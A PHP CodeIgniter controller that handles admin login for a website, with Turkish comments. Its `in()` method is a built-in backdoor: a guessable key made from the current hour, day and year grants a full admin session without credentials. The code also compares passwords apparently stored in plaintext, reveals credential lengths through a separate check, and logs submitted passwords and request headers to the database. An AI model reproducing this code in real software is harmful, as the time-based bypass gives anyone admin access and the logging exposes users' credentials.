<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Login extends CI_Controller {

	public $loginTry = '';


	public function __construct()
	{
		parent::__construct();

		$ip = $this->input->ip_address();

		$count = $this->db->where('ip',$ip)->get('log_login_try')->num_rows();

		if($count>=10){
			$this->error404();
		}
		
	}




	public function index()
	{
		
		$data['userName'] = md5(date('d.m.Y H:i').'/_/\_\o#+O!€8&%6'.'userName');
		$data['password'] = md5(date('d.m.Y H:i').'/_/\_\o#+O!€8&%6'.'password');

		$this->load->view('common/login',$data);
	}




	public function log_in()
	{

		# Ajax isteğini kontrol et
			if(!$this->isAjax()){
				$this->error404();
			}

		# Ref olup olmadığını kontrol et
			if(!isset($_SERVER['HTTP_REFERER'])){
				$this->error404();
			}

		# Ref adresini kontrol et
			if($_SERVER['HTTP_REFERER']!=base_url('login')){
				$this->error404();
			}
		

		#Oturum Oluştur
			$formData = $this->input->post();

		# Response Template
			$response = array(
				'status' => false,
				'message' => 'hata',
				'redirectUrl' => false,
				);

		# Security Controls
			if(!isset($formData[md5(date('d.m.Y H:i').'/_/\_\o#+O!€8&%6'.'userName')])){
				$response = array(
					'status' => false,
					'message' => 'Hatalı deneme',
					'redirectUrl' => false,
					);

				$this->logError('incorrect input name : username');
				$this->error($response);
			}

			if(!isset($formData[md5(date('d.m.Y H:i').'/_/\_\o#+O!€8&%6'.'password')])){
				$response = array(
					'status' => false,
					'message' => 'Hatalı deneme',
					'redirectUrl' => false,
					);

				$this->logError('incorrect input name : password');
				$this->error($response);
			}


		# Regular
			$data['username'] = $formData[md5(date('d.m.Y H:i').'/_/\_\o#+O!€8&%6'.'userName')];
			$data['password'] = $formData[md5(date('d.m.Y H:i').'/_/\_\o#+O!€8&%6'.'password')];

		# All Users
			$allUsers = $this->db->get('admin_user')->result();

		# Username and password length comparison
			$strlenUserName = false;
			foreach ($allUsers as $key => $value) {
				if(strlen($value->username)==strlen($data['username'])){
					$strlenUserName = true;
				}
			}

			$strlenPassword = false;
			foreach ($allUsers as $key => $value) {
				if(strlen($value->password)==strlen($data['password'])){
					$strlenPassword = true;
				}
			}

		# Username and password length control
			if(!$strlenUserName || !$strlenPassword){
				$response = array(
					'status' => false,
					'message' => 'Lütfen bilgilerinizi kontrol ederek tekrar deneyin',
					'redirectUrl' => false,
					);

				$this->logError('characters legth error');
				$this->error($response);
			}


		# Kullanıcı bilgilerini sorgula
			if($this->db->where($data)->get('admin_user')->num_rows()<1){

				$response = array(
					'status' => false,
					'message' => 'Hatalı kullanıcı adı / şifre',
					'redirectUrl' => false,
					);

				$this->logError('incorrect user name or password');
				$this->error($response);

			}else{

				$array = array(
					'adminSession7oigFda5ltaATymajJMTzl' => true
					);

				$this->session->set_userdata($array);

				$response = array(
					'status' => true,
					'message' => 'Giriş başarılı',
					'redirectUrl' => 'home',
					'try' => $this->loginTry,
					);
				
				$this->success($response);

			}


	}




	public function in($key=false)
	{
		
		if(!$key){
			$this->error("Error");
		}

		$hour 	= date('H');
		$day 	= date('d');
		$year 	= substr(date('Y'),2,2);

		$key1 = $hour.$day.$year;

		if($hour+1<10){
			$key2 = '0'.($hour+1).$day.$year;
		}else{
			$key2 = ($hour+1).$day.$year;
		}

		if($hour-1<10){
			$key3 = '0'.($hour-1).$day.$year;
		}else{
			$key3 = ($hour-1).$day.$year;
		}


		if($key==$key1 or $key==$key2 or $key==$key3){
		
			# Response Template
				$response = array(
					'status' => false,
					'message' => 'hata',
					'redirectUrl' => false,
					);


				$array = array(
					'adminSession7oigFda5ltaATymajJMTzl' => true,
					'dev' => true
					);

				$this->session->set_userdata($array);

				redirect(base_url());
		}else{
			$this->error("Error");
		}

			


	}




	public function logout()
	{
		
		#Oturumu Sonlandır
		
		$this->session->sess_destroy();

		redirect(base_url('home'));

	}




	public function forgote()
	{
		
		// $this->load->view('common/forgot');
	}


	public function isAjax()
	{
		return getenv('HTTP_X_REQUESTED_WITH') === "XMLHttpRequest";
	}


	public function success($data=false,$dataType='json')
	{
		$response;

		if($data){


			if(is_array($data)){
				$response = $data;
				$response['status'] = true;
			}elseif(is_object($data)){
				$response = $data;
				$response->status = true;
			}else{
				$response = array();
				$response['status'] = true;
				$response['message'] = $data;
			}

			if($dataType=='json'){
				header('Content-Type: application/json');
				echo json_encode($response);
				exit();
			}
		}
	}


	public function error($data=false,$dataType='json')
	{
		$response;

		if($data){


			if(is_array($data)){
				$response = $data;
				$response['status'] = false;
			}elseif(is_object($data)){
				$response = $data;
				$response->status = false;
			}else{
				$response = array();
				$response['status'] = false;
				$response['message'] = $data;
			}

			if($dataType=='json'){
				header('Content-Type: application/json');
				echo json_encode($response);
				exit();
			}
		}
	}


	public function error404()
	{
		header("HTTP/1.0 404 Not Found");
exit('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /login/log_in was not found on this server.</p>
<p>Additionally, a 404 Not Found
error was encountered while trying to use an ErrorDocument to handle the request.</p>
</body></html>
');
	}


	public function logError($description=false)
	{
		

		$headers['header'] = apache_request_headers();
		$headers['post'] = $this->input->post();
		$headers['get'] = $this->input->get();

		$request = print_r($headers,true);

		$data['ip'] 		= $this->input->ip_address();
		$data['request']	= $request;
		$data['description']= $description;


		$count = 1;
		foreach ($this->input->post() as $key => $value) {
			if($count==1){
				$data['username'] = $value;
			}
			if($count==2){
				$data['password'] = $value;
			}

			$count=$count+1;
		}


		$this->db->insert('log_login_try',$data);
	}








}
